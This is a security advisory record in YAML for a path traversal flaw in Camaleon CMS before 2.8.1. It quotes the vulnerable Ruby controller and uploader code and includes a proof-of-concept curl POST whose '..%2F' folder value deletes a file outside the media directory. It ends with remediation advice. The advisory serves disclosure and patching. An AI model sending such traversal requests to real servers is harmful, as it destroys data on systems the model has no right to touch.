---
identifier: "GHSA-3hp8-6j24-m5gm"
identifiers:
- "GHSA-3hp8-6j24-m5gm"
package_slug: "gem/camaleon_cms"
title: "Camaleon CMS vulnerable to remote code execution through code injection (GHSL-2024-185)"
description: "The [actions](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L51-L52)
  defined inside of the MediaController class do not check whether a given path is
  inside a certain path (e.g. inside the media folder). If an attacker performed an
  account takeover of an administrator account (See: GHSL-2024-184) they could delete
  arbitrary files or folders on the server hosting Camaleon CMS. The [crop_url](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L64-L65)
  action might make arbitrary file writes (similar impact to GHSL-2024-182) for any
  authenticated user possible, but it doesn't seem to work currently.\n\nArbitrary
  file deletion can be exploited with following code path:\nThe parameter folder flows
  from the actions method:\n```ruby\ndef actions\nauthorize! :manage, :media if params[:media_action]
  != 'crop_url'\nparams[:folder] = params[:folder].gsub('//', '/') if params[:folder].present?\ncase
  params[:media_action]\n[..]\nwhen 'del_file'\ncama_uploader.delete_file(params[:folder].gsub('//',
  '/'))\nrender plain: ''\n```\ninto the method delete_file of the CamaleonCmsLocalUploader\nclass
  (when files are uploaded locally):\n```ruby\ndef delete_file(key)\nfile = File.join(@root_folder,
  key)\nFileUtils.rm(file) if File.exist? file\n@instance.hooks_run('after_delete',
  key)\nget_media_collection.find_by_key(key).take.destroy\nend\n```\nWhere it is
  joined in an unchecked manner with the root folder and\nthen deleted.\n\n**Proof
  of concept**\nThe following request would delete the file README.md in the top folder
  of the Ruby on Rails application. (The values for auth_token, X-CSRF-Token and _cms_session
  would also need to be replaced with authenticated values in the curl command below)\n```\ncurl
  --path-as-is -i -s -k -X $'POST' \\\n-H $'X-CSRF-Token: [..]' -H $'User-Agent: Mozilla/5.0'
  -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept:
  */*' -H $'Connection: keep-alive' \\\n-b $'auth_token=[..]; _cms_session=[..]' \\\n--data-binary
  $'versions=&thumb_size=&formats=&media_formats=&dimension=&private=&folder=..\n2F..\n2F..\n2FREADME.md&media_action=del_file'
  \\\n$'https://<camaleon-host>/admin/media/actions?actions=true'\n```\n\n**Impact**\n\nThis
  issue may lead to a defective CMS or system.\n\n**Remediation**\n\nNormalize all
  file paths constructed from untrusted user input before using them and check that
  the resulting path is inside the\ntargeted directory. Additionally, do not allow
  character sequences such as .. in untrusted input that is used to build paths.\n\n**See
  also:**\n\n[CodeQL: Uncontrolled data used in path expression](https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/)\n[OWASP:
  Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)"
date: "2024-09-23"
pubdate: "2024-09-23"
affected_range: "<2.8.1"
fixed_versions:
- "2.8.1"
affected_versions: "All versions before 2.8.1"
not_impacted: "All versions starting from 2.8.1"
solution: "Upgrade to version 2.8.1 or above."
urls:
- "https://github.com/advisories/GHSA-3hp8-6j24-m5gm"
- "https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-7x4w-cj9r-h4v9"
- "https://github.com/owen2345/camaleon-cms"
- "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/camaleon_cms/GHSA-7x4w-cj9r-h4v9.yml"
uuid: "dd8d48be-6004-4fbc-944d-5c11058cb99a"
cwe_ids:
- "CWE-937"
- "CWE-1035"
